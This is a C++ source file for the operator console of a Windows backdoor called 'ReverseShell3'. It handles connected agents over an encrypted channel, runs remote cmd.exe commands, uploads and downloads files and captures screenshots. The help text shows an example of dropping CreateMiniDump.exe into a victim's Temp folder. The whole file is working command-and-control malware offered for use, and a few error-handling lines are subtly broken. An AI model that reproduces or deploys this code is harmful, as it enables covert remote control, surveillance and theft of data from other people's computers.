#include "Stager.h"

M_Result Stager::Listen(PCSTR port, PCSTR ip)
{
	connSocket = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (connSocket.Create() == M_GenericError)
	{
		return M_GenericError;
	}

	if (connSocket.Bind(port, ip) == M_GenericError)
	{
		connSocket.Close();
		return M_GenericError;
	}

    if (not connSocket.SetBlocking(false) == M_GenericError)
    {
        return M_GenericError;
    }

	return M_Success;

}

void Stager::ShutDown()
{
    connSocket.Close();
}

M_Result Stager::OnConnect(Connection& newConnection)
{
    Packet packet;

    BCRYPT_ALG_HANDLE exchDH = NULL;
    BCRYPT_KEY_HANDLE keyPair = NULL;
    BCryptBufferDesc ParameterList = { 0 };
    BCryptBuffer BufferArray[2] = { 0 };
    std::vector<BYTE> pubBlob;
    std::vector<BYTE> serverPubBlob;
    std::vector<BYTE> clientHello(32);
    std::vector<BYTE> serverHello(32);
    std::vector<BYTE> seed(64);
    LPCWSTR Label = L"master secret";

    // generate server hello bytes
    auto optServerHello = EasyBCrypt::GenerateRandomBytes(32);
    if (auto out = std::get_if<EasyBCrypt::STATUS>(&optServerHello))
    {
        std::string err = std::move(*(*out));
        std::cerr << err << std::endl;
        M_GenericError;
    }

    serverHello = std::get<std::vector<BYTE>>(optServerHello);

    // receive clientHello
    if (newConnection.RecvPacket(packet) != M_Success)
    {
        return M_GenericError;
    }
    try
    {
        packet >> clientHello;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return M_GenericError;
    }
    
    // send serverHello
    packet.Clear();
    packet << serverHello;

    if (newConnection.SendPacket(packet) != M_Success)
    {
        return M_GenericError;
    }

    seed.assign(clientHello.begin(), clientHello.end());
    seed.insert(seed.end(), serverHello.begin(), serverHello.end());

    // KDF parameters
    //specify secret to append
    BufferArray[0].BufferType = KDF_TLS_PRF_SEED;
    BufferArray[0].cbBuffer = seed.size();
    BufferArray[0].pvBuffer = (PVOID)&seed[0];

    //specify secret to prepend
    BufferArray[1].BufferType = KDF_TLS_PRF_LABEL;
    BufferArray[1].cbBuffer = (DWORD)((wcslen(Label) + 1) * sizeof(WCHAR));
    BufferArray[1].pvBuffer = (PVOID)Label;

    ParameterList.cBuffers = 2;
    ParameterList.pBuffers = BufferArray;
    ParameterList.ulVersion = BCRYPTBUFFER_VERSION;

    // create Diffie Hellman parameter blob
    std::shared_ptr<BYTE[]> paramBlob = EasyBCrypt::CreateDHParamBlob();

    // Generate keypair
    auto optServerPubBlob = EasyBCrypt::GenerateDHKeyPair(paramBlob, exchDH, keyPair);
    if (auto out = std::get_if<EasyBCrypt::STATUS>(&optServerPubBlob))
    {
        std::string err = *(*out);
        std::cout << err << std::endl;
        M_GenericError;
    }

    // receive the client pubBlob
    if (newConnection.RecvPacket(packet) != M_Success)
    {
        return M_GenericError;
    }

    // obtain the client pubBlob
    try
    {
        packet >> serverPubBlob;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return M_GenericError;
    }

    // send the server pubBlob
    pubBlob = std::get<std::vector<BYTE>>(optServerPubBlob);
    packet.Clear();
    packet << pubBlob;

    if (newConnection.SendPacket(packet) != M_Success)
    {
        return M_GenericError;
    }

    // Generate secret agreement
    auto optSecret = EasyBCrypt::GenerateDHSecret(exchDH, keyPair, serverPubBlob, BCRYPT_KDF_TLS_PRF, &ParameterList);
    if (auto out = std::get_if<EasyBCrypt::STATUS>(&optSecret))
    {
        std::string err = *(*out);
        std::cout << err << std::endl;
        return M_GenericError;
    }

    // 48 bytes shared secret
    std::vector<BYTE> sharedSecret = std::get<std::vector<BYTE>>(optSecret);
    
    // initialize a cipher object
    std::vector<BYTE> key(sharedSecret.begin(), sharedSecret.begin() + 16);

    try
    {
        newConnection.Crypt = Crypter(key);

        if (newConnection.RecvPacket(packet) != M_Success)
        {
            return M_GenericError;
        }

        newConnection.Crypt.DecryptPacket(packet);

        // recevie client current dir
        std::cout << "[+] Accepted connection from Agent!" << std::to_string(newConnection.GetClientSocket()) << " [ip:" << newConnection.GetIp() << ", port : " << newConnection.GetPort() << "] " << std::endl << ">> ";
        std::cout << "[+] Current Directory: ";
        std::cout << packet.ExtractString() << std::endl << ">> ";
    }

    catch (const CrypterException& e)
    {
        std::cout << e.what() << std::endl;
        return M_GenericError;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return M_GenericError;
    }

    return M_Success;
}

void Stager::ConnectionsManager()
{
    // initialize and push the WSAPOLLFD struct to the events vector
    WSAPOLLFD listenSocketFD{};
    listenSocketFD.fd = connSocket.GetSocketHandle();
    listenSocketFD.events = POLLRDNORM;
    listenSocketFD.revents = 0;

    connectionsEvents.push_back(listenSocketFD);

    while (true)
    {
        std::vector<WSAPOLLFD> c_connectionsEvents = connectionsEvents;

        // check for socket events
        if (WSAPoll(c_connectionsEvents.data(), c_connectionsEvents.size(), 4) > 0)
        {
            // check if there is a client that trying to connect
            if (c_connectionsEvents[0].revents & POLLRDNORM)
            {
                // accept the connection
                auto connAttempt = connSocket.Accept();
                if (not connAttempt.has_value())
                {
                    std::cout << "Failed to accept a new connection" << std::endl;
                }

                
                auto [acceptedSocket, connIp, connPort] = connAttempt.value();
                Connection clientConn(acceptedSocket, connIp, connPort);

                // preform encryption handshake and add a new Connection instance to the map
                if (OnConnect(clientConn) == M_Success)
                {
                    WSAPOLLFD newConnectionEvents{};
                    newConnectionEvents.fd = acceptedSocket;
                    newConnectionEvents.events = POLLRDNORM | POLLWRNORM;
                    newConnectionEvents.revents = 0;

                    std::string connId = "Agent!" + std::to_string(acceptedSocket);
                    connections.emplace(connId, clientConn);
                    connectionsEvents.push_back(newConnectionEvents);
                }

                // print out err message if encryption is failed.
                else
                {
                    std::cout << "[!] Failed to encrypt new connection. Closing connection.." << std::endl << ">> ";
                    clientConn.Close();
                }
            }

            for (size_t i = c_connectionsEvents.size() - 1; i > 0; i--)
            {

                if (c_connectionsEvents[i].revents & POLLHUP) //If poll hangup occurred on this socket
                {
                    connectionsEvents.erase(connectionsEvents.begin() + i);
                    CloseConnection(c_connectionsEvents[i].fd, "The connection was either disconnected or aborted with");
                    continue;
                }

                if (c_connectionsEvents[i].revents & POLLERR) //If error occurred on this socket
                {
                    connectionsEvents.erase(connectionsEvents.begin() + i);
                    CloseConnection(c_connectionsEvents[i].fd, "The connection was closed due to an error with");
                    continue;
                }

                if (c_connectionsEvents[i].revents & POLLNVAL) //If invalid socket
                {
                    connectionsEvents.erase(connectionsEvents.begin() + i);
                    CloseConnection(c_connectionsEvents[i].fd, "The connection was closed due to an invalid socket with");
                    continue;
                }
            }
        }
    }
}

void Stager::CloseConnection(SOCKET socketfd, const std::string& reason)
{
    // cleanup
    std::string agentid = "Agent!" + std::to_string(socketfd);
    connections[agentid].Close();
    connections.erase(agentid);
    currentConn = nullptr;
    std::cout << "[!] " << reason << " " << agentid << std::endl << ">> ";
}

void Stager::Run()
{
    connectionsThread = std::thread(&Stager::ConnectionsManager, this);
}

M_Result Stager::Logic(const std::string& cmd)
{
    CommandStructure cmdStrc = InputParser(cmd);
    Packet packet(static_cast<PacketType>(cmdStrc.type));
    M_Result result{};

    try
    {
        if (cmdStrc.type == CommandType::invalid)
        {
            std::cout << cmdStrc.err;
        }

        else if (cmdStrc.type == CommandType::agentdown)
        {

            currentConn->Crypt.EncryptPacket(packet);
            result = currentConn->SendPacket(packet);

            if (result != M_Success)
            {
                return result;
            }
        }

        else if (cmdStrc.type == CommandType::upload)
        {
            std::filesystem::path localpath(cmdStrc.local_path);
            std::filesystem::path remotepath(cmdStrc.remote_path);
            remotepath /= localpath.filename();

            // check if file exists locally
            if (std::filesystem::exists(localpath))
            {
                // send a packet with the remotepath and filesize
                uintmax_t filesize = std::filesystem::file_size(localpath);
                packet << remotepath.string() << filesize;
                currentConn->Crypt.EncryptPacket(packet);

                result = currentConn->SendPacket(packet);
                if (result != M_Success)
                {
                    return result;
                }

                // receive one packet to confirm the remote path validity
                result = currentConn->RecvPacket(packet);
                if (result != M_Success)
                {
                    return result;
                }

                currentConn->Crypt.DecryptPacket(packet);

                if (packet.GetPacketType() != PacketType::Invalid)
                {
                    result = currentConn->SendFile(localpath.string(), filesize);
                    if (result != M_Success)
                    {
                        return result;
                    }
                }

                // if the remote path is invalid print out err msg
                else
                {
                    std::cout << ">> [!] The specified remote path is invalid." << std::endl;
                }
            }

            // if the file is not exist locally print out error msg
            else
            {
                std::cout << ">> [!] No such file or directory." << std::endl;
            }
        }

        else if (cmdStrc.type == CommandType::download)
        {
            if (std::filesystem::exists(cmdStrc.local_path) and std::filesystem::is_directory(cmdStrc.local_path))
            {
                packet << cmdStrc.remote_path;

                currentConn->Crypt.EncryptPacket(packet);

                // send packet with the file name which we want to receive
                result = currentConn->SendPacket(packet);
                if (result != M_Success)
                {
                    return result;
                }

                // receive one packet and check if there is an error regrading the file specified path
                result = currentConn->RecvPacket(packet);
                if (result != M_Success)
                {
                    return result;
                }

                currentConn->Crypt.DecryptPacket(packet);

                if (packet.GetPacketType() == PacketType::Invalid)
                {
                    std::cout << ">> [!] No such file or directory." << std::endl;
                    return M_GenericWarning;
                }

                uint32_t bytesToRead;
                packet >> bytesToRead;

                std::filesystem::path localpath(cmdStrc.local_path);
                std::filesystem::path remotepath(cmdStrc.remote_path);
                localpath /= remotepath.filename();

                std::string path = localpath.string();
                result = currentConn->RecvFile(path, bytesToRead);
                if (result != M_Success)
                {
                    return result;
                }
            }

            else
            {
                std::cout << ">> [!] Invalid local path." << std::endl;
            }

        }

        else if (cmdStrc.type == CommandType::screenshot)
        {
            std::string filename = "sc_XXXXXX";

            if (::_mktemp_s(const_cast<char*>(filename.c_str()), filename.size() + 1) != 0)
            {
                std::cerr << "Error at _mktemp_s." << std::endl;
                return M_GenericError;
            }

            filename = filename + ".jpg";

            std::filesystem::path fullpath(cmdStrc.local_path);
            fullpath /= filename;

            currentConn->Crypt.EncryptPacket(packet);

            result = currentConn->SendPacket(packet);
            if (result != M_Success)
            {
                return result;
            }

            result = currentConn->RecvPacket(packet);
            if (result != M_Success)
            {
                return result;
            }

            currentConn->Crypt.DecryptPacket(packet);

            std::string fileBuffer;
            packet >> fileBuffer;

            std::fstream file;
            file.open(filename, std::ios::out | std::ios::binary);

            if (not file.is_open())
            {
                std::cerr << "Error while trying to open the file." << std::endl;
                return M_GenericError;
            }

            file.write(&fileBuffer[0], fileBuffer.size());
            file.close();
        }

        else
        {
            if (cmdStrc.type == CommandType::changedir)
            {
                packet << cmdStrc.remote_path;
            }

            else
            {
                packet << cmdStrc.cmd;
            }

            currentConn->Crypt.EncryptPacket(packet);

            result = currentConn->SendPacket(packet);
            if (result != M_Success)
            {
                return result;
            }

            result = currentConn->RecvPacket(packet);
            if (result != M_Success)
            {
                return result;
            }

            currentConn->Crypt.DecryptPacket(packet);

            std::cout << packet.ExtractString() + "\n";
        }
    }

    catch (const CrypterException& e)
    {
        std::cout << e.what() << std::endl;
        return M_GenericError;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return M_GenericError;
    }
    return M_Success;
}

void Stager::PrintHelp()
{
    std::cout << "[+] ReverseShell3 Backdoor" << std::endl;
    std::cout << "    ReverseShell3 is a simple windows backdoor over TCP connection, which implements the following functionality:" << std::endl;
    std::cout << std::endl;
    std::cout << "    * Execute command." << std::endl;
    std::cout << "    * Upload command." << std::endl;
    std::cout << "    * Download command." << std::endl;
    std::cout << "    * Screenshot command." << std::endl;
    std::cout << "    * Agentdown command." << std::endl;
    std::cout << std::endl;
    std::cout << "    Execute command - executes command via cmd.exe /c." << std::endl;;
    std::cout << std::endl;
	std::cout << "    Upload command - upload a file to a remote computer." << std::endl;
	std::cout << "    To use the upload command it is required to specify the --upload keyword following by the local path of the file following by the target path at the remote computer." << std::endl;
	std::cout << "    Example: --upload --localpath CreateMiniDump.exe --remotepath C:\\Users\\MyUserNAme\\AppData\\Local\\Temp" << std::endl;
    std::cout << std::endl;
	std::cout << "    Download command - download a file from a remote client." << std::endl;
	std::cout << "    To use the download command it is required to specify the --download keyword following by the remotepath of the file following by the download folder." << std::endl;
	std::cout << "    Example: --download --remotepath C:\\Users\\MyUserNAme\\AppData\\Local\\Temp --localpath ." << std::endl;
    std::cout << std::endl;
	std::cout << "    Screenshot command - capture a screenshot and download the image from a remote computer." << std::endl;
	std::cout << "    To use the screenshot command it is required to specify the --screenshot keyword." << std::endl;
    std::cout << std::endl;
	std::cout << "    Agentdown command - terminate the remote client." << std::endl;
	std::cout << "    To use the agentdown command it is required to specify the --agentdown keyword." << std::endl;
    std::cout << std::endl;
}

void Stager::PrintAgents()
{
    if (not connections.empty())
    {
        std::cout << ">> " << std::left << std::setw(12) << "Agent" << std::left << std::setw(11) << "IP" << std::left << std::setw(11) << "Active" << std::endl;

        for (auto& c : connections)
        {
            if (&c.second == currentConn)
            {
                std::cout << ">> " << std::left << std::setw(12) << c.first << std::left << std::setw(11) << c.second.GetIp() << std::left << std::setw(11) << "TRUE" << std::endl;
            }

            else
            {
                std::cout << ">> " << std::left << std::setw(12) << c.first << std::left << std::setw(11) << c.second.GetIp() << std::endl;
            }
        }
            
    }

    else
    {
        std::cout << ">> [!] No available agents were found." << std::endl;
    }

}

void Stager::SetCurrentAgent(const std::string& input)
{
    size_t agentStartIndex = input.find(" ");
    std::string agent;

    if (agentStartIndex != std::string::npos)
    {
        agent = input.substr(agentStartIndex + 1);
    }

    if (connections.find(agent) != connections.end())
    {
        currentConn = &connections[agent];

        std::cout << ">> [+] " << agent << " is now active." << std::endl;
    }

    else
    {
        std::cout << ">> [!] Invalid agent or agent is not connected." << std::endl;
    }
}

Connection* const Stager::GetCurrentAgent() const
{
    return currentConn;
}

CommandStructure Stager::InputParser(const std::string& input)
{
    CommandStructure commandStrc;
    std::string_view command;
    size_t spaceIndex = input.find(" ");

    if (spaceIndex != std::string::npos)
        command = std::string_view(input.c_str() + input.find(' ') + 1);

    if (input.starts_with("--agentdown") or input.starts_with("--ag"))
        commandStrc.type = CommandType::agentdown;

    else if (input.starts_with("--upload") or input.starts_with("--u"))
    {
        commandStrc.type = CommandType::upload;
        std::string_view localpath(command.data() + command.find(" ") + 1);

        if (command.starts_with("--localpath"))
        {
            commandStrc.local_path = localpath.substr(0, localpath.find(" "));
            std::string_view remotepath(localpath.data() + localpath.find(" ") + 1);
            if (remotepath.starts_with("--remotepath"))
            {
                commandStrc.remote_path = remotepath.substr(remotepath.find(" ") + 1);
            }
            else
            {
                commandStrc.type = CommandType::invalid;
                commandStrc.err = "[-] Please provide remotepath.\n[-] Invalid Command.\n";
                return commandStrc;
            }
        }

        else
        {
            commandStrc.type = CommandType::invalid;
            commandStrc.err = "[-] Please provide localpath.\n[-] Invalid Command.\n";
            return commandStrc;
        }
    }

    else if (input.starts_with("--download") or input.starts_with("--d"))
    {
        commandStrc.type = CommandType::download;
        std::string_view remotepath(command.data() + command.find(" ") + 1);

        if (command.starts_with("--remotepath"))
        {
            commandStrc.remote_path = remotepath.substr(0, remotepath.find(" "));
            std::string_view localpath(remotepath.data() + remotepath.find(" ") + 1);
            if (localpath.starts_with("--localpath"))
            {
                commandStrc.local_path = localpath.substr(localpath.find(" ") + 1);
            }
            else
            {
                commandStrc.type = CommandType::invalid;
                commandStrc.err = "[-] Please provide localpath.\n[-] Invalid Command.\n";
                return commandStrc;
            }
        }

        else
        {
            commandStrc.type = CommandType::invalid;
            commandStrc.err = "[-] Please provide remotepath.\n[-] Invalid Command.\n";
            return commandStrc;
        }
    }

    else if (input.starts_with("--screenshot") or input.starts_with("--cs"))
    {
        commandStrc.type = CommandType::screenshot;
        //std::string_view localpath(command.data() + command.find(" ") + 1);
        //if (localpath.starts_with("--localpath"))
        //{
        //    commandStrc.local_path = localpath.substr(localpath.find(" ") + 1);
        //}

        //else
        //{
        //    commandStrc.type = CommandType::invalid;
        //    commandStrc.err = "[-] Please provide localpath.\n[-] Invalid Command.\n";
        //    return commandStrc;
        //}
    }

    else
    {
        if (input.starts_with("cd "))
        {
            commandStrc.type = CommandType::changedir;
            commandStrc.remote_path = command;
            return commandStrc;
        }

        commandStrc.type = CommandType::commandline;
        commandStrc.cmd = input;
    }

    return commandStrc;
}
